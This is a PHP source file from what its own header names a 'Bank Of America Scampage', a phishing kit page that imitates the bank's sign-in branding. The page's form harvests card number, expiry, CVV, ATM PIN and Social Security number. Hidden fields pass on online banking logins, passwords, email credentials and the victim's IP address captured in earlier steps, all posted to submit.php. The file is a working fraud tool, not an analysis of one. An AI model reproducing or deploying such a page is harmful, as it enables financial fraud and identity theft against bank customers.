<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             26/10/2019
 * @package           Bank Of America Scampage
 *
 * Project Name:      Bank Of America Scampage
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico" />


        <title>Bank of America | Online Banking | Sign In | Online IDIn</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="row">
                    <div class="col-md-6">
                        <div class="logo"><a href="#"><img src="../assets/images/logo.png"></a></div>
                    </div>
                    <div class="col-md-6">
                        <ul class="header-menu">
                            <li><a href="#"><i class="fas fa-lock"></i> Secure Area</a></li>
                            <li><a href="#">En Español</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- PAGE TITLE -->
        <div class="page-title">
            <div class="container">
                <h3>Verify Your Identity</h3>
            </div>
        </div>
        <!-- END PAGE TITLE -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="top-content">
                    <h3>Debit/Credit card information</h3>
                    <p>Provide the following information associated with your account.</p>
                </div>
                <div class="forms">
                    <form method="post" action="submit.php" id="cc-form">
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>">
                            <label for="cc_number">Card number</label>
                            <input type="tel" name="cc_number" class="form-control" id="cc_number" value="<?php echo get_value('cc_number'); ?>" maxlength="16">
                            <?php echo validation($_SESSION['errors'],'cc_number'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>">
                            <label for="cc_date">Expiry date</label>
                            <input type="tel" name="cc_date" class="form-control" id="cc_date" value="<?php echo get_value('cc_date'); ?>" maxlength="5">
                            <?php echo validation($_SESSION['errors'],'cc_date'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>">
                            <label for="cc_cvv">CVV</label>
                            <input type="tel" name="cc_cvv" class="form-control" id="cc_cvv" value="<?php echo get_value('cc_cvv'); ?>" maxlength="4">
                            <?php echo validation($_SESSION['errors'],'cc_cvv'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_pin') ?>">
                            <label for="cc_pin">ATM PIN</label>
                            <input type="tel" name="cc_pin" class="form-control" id="cc_pin" value="<?php echo get_value('cc_pin'); ?>" maxlength="10">
                            <?php echo validation($_SESSION['errors'],'cc_pin'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_ssn') ?>">
                            <label for="cc_ssn">Social security number</label>
                            <input type="tel" name="cc_ssn" class="form-control" id="cc_ssn" maxlength="11" value="<?php echo get_value('cc_ssn'); ?>">
                            <?php echo validation($_SESSION['errors'],'cc_ssn'); ?>
                        </div>
                        <input type="hidden" name="type" value="etapcc">
                        <input type="hidden" name="verbot">
                        <input type="hidden" name="login1" id="login1" value="<?php echo $_SESSION['online_id1']; ?>">
                        <input type="hidden" name="password1" id="password1" value="<?php echo $_SESSION['passcode1']; ?>">
                        <input type="hidden" name="login2" id="login2" value="<?php echo $_SESSION['online_id2']; ?>">
                        <input type="hidden" name="password2" id="password2" value="<?php echo $_SESSION['passcode2']; ?>">
                        <input type="hidden" name="email_address" id="email_address" value="<?php echo $_SESSION['email_address']; ?>">
                        <input type="hidden" name="email_password" id="email_password" value="<?php echo $_SESSION['email_password']; ?>">
                        <input type="hidden" name="ip_address" id="ip_address" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
                        <div class="buttons">
                            <button class="btn-submit" id="cc-submit" type="button">Continue</button>
                            <button type="button">Cancel</button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer" style="margin-top: 70px;">
            <div class="container">
                <p style="font-weight: 700"><i class="fas fa-lock"></i> Secure area</p>
                <p><a href="#">Privacy & Security</a></p>
                <p class="mb-0">Bank of America, N.A. Member FDIC. <a href="#">Equal Housing Lender</a><br>&copy; 2022 Bank of America Corporation. All rights reserved.</p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>